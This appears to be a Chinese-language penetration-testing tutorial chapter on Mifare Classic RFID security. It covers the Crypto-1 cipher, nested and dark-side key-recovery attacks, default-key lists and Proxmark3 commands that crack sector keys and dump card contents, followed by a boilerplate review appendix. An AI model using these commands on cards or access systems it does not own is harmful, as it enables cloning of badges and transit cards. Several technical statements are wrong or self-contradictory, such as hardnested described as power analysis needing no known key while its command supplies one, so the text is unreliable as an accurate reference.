# Mifare Classic深度安全分析

### 10.1 Crypto-1加密算法详解

```
Crypto-1流密码架构:

  Crypto-1是NXP(Mifare)专有流密码，基于以下组件:

  1. 48位LFSR(线性反馈移位寄存器)
     | 48个移位寄存器: R[0]..R[47]
     | 反馈多项式: 固定(但保密)
     | 每个时钟周期移位一次
     | 输出1位密钥流

  2. 过滤函数(filter function)
     | 从LFSR状态中选择5位
     | 通过非线性布尔函数
     | 输出1位密钥流比特
     | 过滤多项式固定(保密)

  3. 认证协议
     Step 1: 读卡器发送认证请求 (KeyA/B, Sector)
     Step 2: 卡片生成随机数 nT (Tag nonce, 32位)
     Step 3: 读卡器生成随机数 nR (Reader nonce, 32位)
             加密: aR = keystream ^ (nR ^ nT_response)
     Step 4: 卡片验证nR, 返回加密的Token
     Step 5: 双方建立会话密钥

  密钥流生成:
     keystream = filter(LFSR_state)
     每个加密位使用LFSR的一个状态

  Crypto-1的致命缺陷:
  1. PRNG可预测
     - 24位LFSR生成随机数
     - 可预测下一个nonce
     - 攻击者可重放/预测

  2. LFSR线性性
     - 48位状态空间可被搜索
     - 已知明文攻击效率高

  3. 过滤函数弱点
     - 过滤函数度数低
     - 可通过代数攻击恢复

  4. 认证设计缺陷
     - 首先发送加密nR
     - 如果nT已知,可推导密钥流
     - 嵌套攻击利用此特性
```

### 10.2 Nested Authentication攻击详解

```
Nested Authentication Attack(嵌套认证攻击):

前提: 已知至少一个扇区的密钥(通常是默认密钥)

攻击原理:
  1. 用已知密钥认证Sector A
  2. 认证成功后,获取加密密钥流
  3. 向Sector B发起认证请求
  4. 获取Sector B的nonce nT_B
  5. nT_B由PRNG生成,PRNG可预测
  6. 结合密钥流分析,恢复Sector B的密钥

攻击步骤详解:

  Step 1: 获取已知密钥
  - Mifare Classic出厂默认密钥:
    Key A: FFFFFFFFFFFF
    Key B: FFFFFFFFFFFF
  - 常见默认密钥列表:
    000000000000
    A0A1A2A3A4A5
    D3F7D3F7D3F7
    A5A4A3A2A1A0

  Step 2: 认证已知扇区
  - 发送auth命令到Sector 0
  - 使用默认密钥认证
  - 获取加密会话

  Step 3: PRNG状态恢复
  - 卡片的nonce生成器是24位LFSR
  - 通过多次认证获取多个nonce
  - 恢复PRNG内部状态
  - 预测下一个nonce

  Step 4: 未知扇区认证
  - 发起对未知扇区的认证
  - 获取nT_B(已知PRNG状态可预测)
  - 读卡器发送加密nR
  - 分析加密响应

  Step 5: 密钥恢复
  - 通过数学分析
  - 结合多个认证会话数据
  - 恢复48位密钥
  - 整个过程约2-30秒
```

```bash
# Proxmark3执行Nested Attack
proxmark3> hf mf fchk 0
# 检查Sector 0的所有默认密钥

# 如果找到已知密钥(如FFFFFFFFFF)
# 执行嵌套攻击恢复所有密钥
proxmark3> hf mf nested 0 A ffffffffffff
# 从Sector 0 Key A开始,恢复所有扇区密钥

# 输出示例:
# Testing with known key...  FFFFFFFFFFFF  -> valid
# Nested attack started...
# Sector 0: A:FFFFFFFFFFFF B:FFFFFFFFFFFF
# Sector 1: A:A0A1A2A3A4A5 B:B0B1B2B3B4B5
# Sector 2: A:1234567890AB B:FFFFFFFFFFFF
# ...
# All keys recovered in 3.2 seconds

# 使用恢复的密钥转储所有数据
proxmark3> hf mf dump
# 转储所有扇区数据到文件

# Hardnested攻击(更强)
# 不需要任何已知密钥
proxmark3> hf mf hardnested 0 A ffffffffffff
# 通过侧信道分析恢复密钥(较慢但更强大)
```

### 10.3 Mifare Classic暗门攻击

```
Dark Side Attack(暗门攻击/暴力密钥恢复):

当没有任何已知密钥时:

  1. 利用认证协议的错误处理
  2. 发送故意错误的nR
  3. 观察卡片的响应(加密Token)
  4. 通过分析错误响应推导密钥

  原理:
  - 认证失败时,卡片仍然返回加密数据
  - 这些数据包含关于密钥的侧信道信息
  - 通过大量查询(约2^24次)恢复密钥

  限制:
  - 较新的卡片固件修复了此漏洞
  - 耗时较长(分钟到小时)
  - 可能损坏卡片(过度读取)

  Hardnested改进:
  - 结合功耗分析
  - 利用LFSR的线性特性
  - 使用SAT求解器
  - 大幅减少查询次数
  - 即使没有已知密钥也能恢复
```

---

---

## 📋 内容审核与补充建议

> 针对「Mifare Classic深度安全分析」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
